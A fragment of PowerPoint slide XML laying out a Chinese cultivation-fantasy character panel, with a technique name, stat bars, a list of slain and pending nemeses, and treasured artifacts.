            <a:ext cx="809204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未知</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Shape 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="71929" y="5362097"/>
            <a:ext cx="2553487" cy="395611"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="170900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="6B38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25876" y="5434027"/>
            <a:ext cx="215788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◎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377628" y="5434027"/>
            <a:ext cx="1438584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25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飞升·仙界</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="825" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Text 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1798230" y="5434027"/>
            <a:ext cx="809204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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Shape 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697345" y="839549"/>
            <a:ext cx="4288779" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A04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805239" y="965425"/>
            <a:ext cx="4072991" cy="1168850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="6B38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805239" y="965425"/>
            <a:ext cx="4072991" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD7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877168" y="1037354"/>
            <a:ext cx="1978053" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw blurRad="38100" dist="50800" dir="16200000" algn="bl" rotWithShape="0">
              <a:srgbClr val="FF8800">
                <a:alpha val="4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混沌万古诀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4909168" y="1055336"/>
            <a:ext cx="629381" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="200800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09168" y="1055336"/>
            <a:ext cx="629381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们级至尊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2877168" y="1253142"/>
            <a:ext cx="3929133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kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B3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创始人: 荒古大能 · 炼就于宇宙初开之时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2877168" y="1397000"/>
            <a:ext cx="3929133" cy="359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675" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A07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“吾以一剑破万法，逆推天地运转之机，参悟混沌本源，以荒古之力镇压万古神魔……”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="Text 67"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877168" y="1774628"/>
            <a:ext cx="323681" cy="719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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B6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真元</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Shape 68"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3218832" y="1783619"/>
            <a:ext cx="2877168" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="3A18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218832" y="1783619"/>
            <a:ext cx="2503136" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6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49947" y="1774628"/>
            <a:ext cx="359646" cy="719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563" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B87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87%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="Text 71"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877168" y="1864540"/>
            <a:ext cx="323681" cy="719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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B6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神识</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Shape 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3218832" y="1873531"/>
            <a:ext cx="2877168" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="3A18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218832" y="1873531"/>
            <a:ext cx="2733310" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="006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49947" y="1864540"/>
            <a:ext cx="359646" cy="719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563" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B87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95%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Text 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877168" y="1954451"/>
            <a:ext cx="323681" cy="719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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B6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杀伐</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Shape 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3218832" y="1963442"/>
            <a:ext cx="2877168" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="3A18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218832" y="1963442"/>
            <a:ext cx="2877168" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF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49947" y="1954451"/>
            <a:ext cx="359646" cy="719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563" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B87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满</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Text 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877168" y="2044363"/>
            <a:ext cx="323681" cy="719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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B6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道心</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Shape 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3218832" y="2053354"/>
            <a:ext cx="2877168" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0800"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="3A18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218832" y="2053354"/>
            <a:ext cx="2244191" cy="53947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="AA0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149947" y="2044363"/>
            <a:ext cx="359646" cy="719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563" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B87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78%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Text 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="2206204"/>
            <a:ext cx="4072991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75" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B6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斩杀记录 · 万古征程 ◆</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Shape 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="2386027"/>
            <a:ext cx="4072991" cy="1348673"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E0600"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="4A2800"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="87" name="Chart 0"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="2841204" y="2421991"/>
          <a:ext cx="4001062" cy="12587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8" name="Text 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="3770664"/>
            <a:ext cx="4072991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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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《功法境界》混沌剑封印 · 当前功法修炼加成：化神九重 87%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Text 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="3950487"/>
            <a:ext cx="4072991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B6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道心堅固，神识开六想天外天——福地诞生在屴5999年</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="Text 87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="4112327"/>
            <a:ext cx="4072991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B6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利剦: 混沌剑·万古断 (先天至宝) | 威力: 无法衡量的</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="Text 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="4274168"/>
            <a:ext cx="4072991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B6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当前目标: 度劫天劫 → 突破大乘境 → 最终飞升</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Shape 89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6986124" y="839549"/>
            <a:ext cx="2157876" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E0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6986124" y="1558841"/>
            <a:ext cx="26973" cy="3596460"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B873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6986124" y="929460"/>
            <a:ext cx="2157876" cy="197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5" b="1" kern="0" spc="200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天道宿敌</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Shape 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7129982" y="1145248"/>
            <a:ext cx="1870159" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6B3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7058053" y="1235159"/>
            <a:ext cx="2014018" cy="341664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1609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7058053" y="1567832"/>
            <a:ext cx="2014018" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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7076035" y="1271124"/>
            <a:ext cx="215788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💀</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="Text 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7327788" y="1271124"/>
            <a:ext cx="1078938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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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上古神魔·魔皇尊</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Shape 97"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8442690" y="1307088"/>
            <a:ext cx="539469" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A1A1A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8442690" y="1307088"/>
            <a:ext cx="539469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已斩</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="Shape 99"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="1612788"/>
            <a:ext cx="2014018" cy="341664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1609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7058053" y="1945460"/>
            <a:ext cx="2014018" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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7076035" y="1648752"/>
            <a:ext cx="215788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👑</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Text 102"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7327788" y="1648752"/>
            <a:ext cx="1078938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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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天道意志·轮回神君</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="Shape 103"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8442690" y="1684717"/>
            <a:ext cx="539469" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A1A1A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8442690" y="1684717"/>
            <a:ext cx="539469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已斩</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="Shape 105"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="1990416"/>
            <a:ext cx="2014018" cy="341664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1609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7058053" y="2323088"/>
            <a:ext cx="2014018" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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0" name="Text 107"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7076035" y="2026381"/>
            <a:ext cx="215788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1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111" name="Text 108"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7327788" y="2026381"/>
            <a:ext cx="1078938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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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雷罚天劫·九天雷尊</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112" name="Shape 109"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8442690" y="2062345"/>
            <a:ext cx="539469" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A1A1A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8442690" y="2062345"/>
            <a:ext cx="539469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已斩</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Shape 111"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="2368044"/>
            <a:ext cx="2014018" cy="341664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1609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7058053" y="2700717"/>
            <a:ext cx="2014018" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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7076035" y="2404009"/>
            <a:ext cx="215788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🌀</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Text 114"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7327788" y="2404009"/>
            <a:ext cx="1078938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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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混沌之主·无名古神</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Shape 115"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8442690" y="2439973"/>
            <a:ext cx="539469" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A0800"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF4422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8442690" y="2439973"/>
            <a:ext cx="539469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4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对峪中</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="120" name="Shape 117"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="2745673"/>
            <a:ext cx="2014018" cy="341664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1609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7058053" y="3078345"/>
            <a:ext cx="2014018" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A2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2" name="Text 119"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7076035" y="2781637"/>
            <a:ext cx="215788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❓</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Text 120"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7327788" y="2781637"/>
            <a:ext cx="1078938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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC8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???·破界者</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Shape 121"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8442690" y="2817602"/>
            <a:ext cx="539469" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A0800"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="FF4422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8442690" y="2817602"/>
            <a:ext cx="539469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4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未知</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126" name="Shape 123"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="3177248"/>
            <a:ext cx="2014018" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6B3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6986124" y="3249177"/>
            <a:ext cx="2157876" cy="1798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5" b="1" kern="0" spc="200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镇压神器</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Shape 125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="3464965"/>
            <a:ext cx="2014018" cy="539469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="4A2800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7112000" y="3536894"/>
            <a:ext cx="269735" cy="3776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⚔️</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Text 127"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="3536894"/>
            <a:ext cx="1618407" cy="197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C8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混沌剑·万古断</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Text 128"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="3734699"/>
            <a:ext cx="1618407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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF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先天至宝</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="132" name="Shape 129"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="4076363"/>
            <a:ext cx="2014018" cy="539469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="4A2800"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Text 130"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7112000" y="4148292"/>
            <a:ext cx="269735" cy="3776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🔮</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="134" name="Text 131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="4148292"/>
            <a:ext cx="1618407" cy="197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C8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混沌珠</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Text 132"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="4346097"/>
            <a:ext cx="1618407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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF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鸿蒙至宝 · 镇压本命</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Shape 133"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7058053" y="4687761"/>
            <a:ext cx="2014018" cy="539469"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="180900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="4A2800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7112000" y="4759690"/>
            <a:ext cx="269735" cy="3776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📜</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="138" name="Text 135"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="4759690"/>
            <a:ext cx="1618407" cy="197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C8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万古功法残卷</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="139" name="Text 136"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417699" y="4957496"/>
            <a:ext cx="1618407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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF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始祖级 · 残缺7卷/9</a:t>
            </a:r>
